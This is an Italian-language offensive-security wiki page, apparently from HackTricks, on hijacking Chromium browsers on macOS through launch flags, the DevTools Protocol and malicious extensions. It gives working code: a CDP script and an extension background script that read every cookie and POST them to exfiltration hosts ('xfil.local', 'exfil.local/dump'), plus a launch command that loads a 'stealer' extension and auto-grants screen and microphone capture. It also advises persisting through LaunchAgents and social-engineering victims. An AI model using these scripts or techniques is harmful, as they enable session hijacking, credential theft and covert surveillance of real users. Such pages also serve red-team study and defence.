# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Informazioni di base

I browser basati su Chromium come Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi e Opera condividono gli stessi command-line switches, i file di preferenze e le interfacce di automazione DevTools. Su macOS, qualsiasi utente con accesso GUI può terminare una sessione del browser esistente e riaprirla con flag, estensioni o endpoint DevTools arbitrari che vengono eseguiti con gli entitlements del bersaglio.

#### Launching Chromium with custom flags on macOS

macOS mantiene un'unica istanza UI per profilo Chromium, quindi l'instrumentation normalmente richiede di forzare la chiusura del browser (ad esempio con `osascript -e 'tell application "Google Chrome" to quit'`). Gli aggressori tipicamente rilanciano usando `open -na "Google Chrome" --args <flags>` in modo da poter iniettare argomenti senza modificare il bundle dell'app. Inserire quel comando dentro un LaunchAgent utente (`~/Library/LaunchAgents/*.plist`) o un login hook garantisce che il browser manomesso venga riavviato dopo reboot/logoff.

#### `--load-extension` Flag

Il flag `--load-extension` carica automaticamente estensioni unpacked (percorsi separati da virgola). Abbinalo a `--disable-extensions-except` per bloccare le estensioni legittime costringendo a eseguire solo il tuo payload. Estensioni dannose possono richiedere permessi ad alto impatto come `debugger`, `webRequest` e `cookies` per pivotare sui DevTools protocols, modificare gli header CSP, degradare HTTPS o esfiltrare materiale di sessione non appena il browser si avvia.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Questi switch espongono il Chrome DevTools Protocol (CDP) su TCP o su una pipe in modo che tool esterni possano controllare il browser. Google ha osservato un diffuso abuso da parte di infostealer di questa interfaccia e, a partire da Chrome 136 (marzo 2025), gli switch vengono ignorati per il profilo di default a meno che il browser non venga lanciato con un `--user-data-dir` non standard. Questo applica App-Bound Encryption sui profili reali, ma gli aggressori possono comunque creare un profilo nuovo, indurre la vittima ad autenticarsi al suo interno (phishing/assistenza di triage) e raccogliere cookie, token, stati di device trust o registrazioni WebAuthn via CDP.

#### `--user-data-dir` Flag

Questo flag reindirizza l'intero profilo del browser (History, Cookies, Login Data, file di Preference, ecc.) in un percorso controllato dall'attaccante. È obbligatorio quando si combinano build moderne di Chrome con `--remote-debugging-port`, e mantiene il profilo manomesso isolato così da poter inserire file `Preferences` o `Secure Preferences` pre-popolati che disabilitano prompt di sicurezza, auto-installano estensioni e cambiano gli schemi predefiniti.

#### `--use-fake-ui-for-media-stream` Flag

Questo switch bypassa il prompt di permesso per camera/microfono in modo che qualsiasi pagina che chiami `getUserMedia` ottenga subito accesso. Combinalo con flag come `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk`, o con comandi CDP `Browser.grantPermissions` per catturare silenziosamente audio/video, condividere il desktop o superare controlli di permessi WebRTC senza interazione dell'utente.

## Remote Debugging & DevTools Protocol Abuse

Una volta che Chrome è rilanciato con un `--user-data-dir` dedicato e `--remote-debugging-port`, puoi collegarti via CDP (ad esempio tramite `chrome-remote-interface`, `puppeteer` o `playwright`) e scriptare workflow con privilegi elevati:

- **Cookie/session theft:** `Network.getAllCookies` e `Storage.getCookies` restituiscono valori HttpOnly anche quando App-Bound encryption normalmente bloccherebbe l'accesso al filesystem, perché CDP chiede al browser in esecuzione di decriptarli.
- **Permission tampering:** `Browser.grantPermissions` e `Emulation.setGeolocationOverride` permettono di bypassare i prompt per camera/microfono (soprattutto se combinati con `--use-fake-ui-for-media-stream`) o di falsificare controlli di sicurezza basati sulla posizione.
- **Keystroke/script injection:** `Runtime.evaluate` esegue JavaScript arbitrario nella tab attiva, abilitando il furto di credenziali, la modifica del DOM o l'iniezione di beacons di persistenza che sopravvivono alla navigazione.
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` e `Fetch.enable` intercettano richieste/risposte autenticate in tempo reale senza toccare artefatti su disco.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Poiché Chrome 136 blocca CDP sul profilo predefinito, copiare/incollare la directory esistente della vittima `~/Library/Application Support/Google/Chrome` in un percorso di staging non produce più cookie decrittati. Invece, social-engineer l'utente per farlo autenticare all'interno del profilo strumentato (ad es., una sessione di supporto "helpful") oppure cattura i token MFA in transito tramite hook di rete controllati da CDP.

## Iniezione tramite estensione via Debugger API

La ricerca del 2023 "Chrowned by an Extension" ha dimostrato che un'estensione malevola che utilizza la `chrome.debugger` API può collegarsi a qualsiasi scheda e ottenere gli stessi poteri di DevTools di `--remote-debugging-port`. Questo rompe le assunzioni originali di isolamento (le estensioni rimangono nel loro contesto) e permette:

- Furto silenzioso di cookie e credenziali con `Network.getAllCookies`/`Fetch.getResponseBody`.
- Modifica delle autorizzazioni del sito (camera, microfono, geolocalizzazione) e bypass degli interstitial di sicurezza, permettendo a pagine di phishing di impersonare i dialog di Chrome.
- Manomissione on-path degli avvisi TLS, dei download o dei prompt WebAuthn pilotando programmaticamente `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` o `Security.handleCertificateError`.

Carica l'estensione con `--load-extension`/`--disable-extensions-except` in modo che non sia necessaria l'interazione dell'utente. Uno script di background minimale che arma l'API si presenta così:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
L'estensione può anche sottoscriversi agli eventi `Debugger.paused` per leggere variabili JavaScript, patchare script inline o inserire breakpoint personalizzati che sopravvivono alla navigazione. Poiché tutto viene eseguito all'interno della sessione GUI dell'utente, Gatekeeper e TCC non vengono attivati, rendendo questa tecnica ideale per malware che ha già ottenuto l'esecuzione nel user context.

### Strumenti

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatizza l'avvio di Chromium con payload extensions ed espone hook CDP interattivi.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Strumenti simili focalizzati su traffic interception e browser instrumentation per operatori macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Libreria Node.js per automatizzare dump del Chrome DevTools Protocol (cookies, DOM, permissions) una volta che un'istanza con `--remote-debugging-port` è attiva.

### Esempio
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Trova più esempi nei link degli strumenti.

## Riferimenti

- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
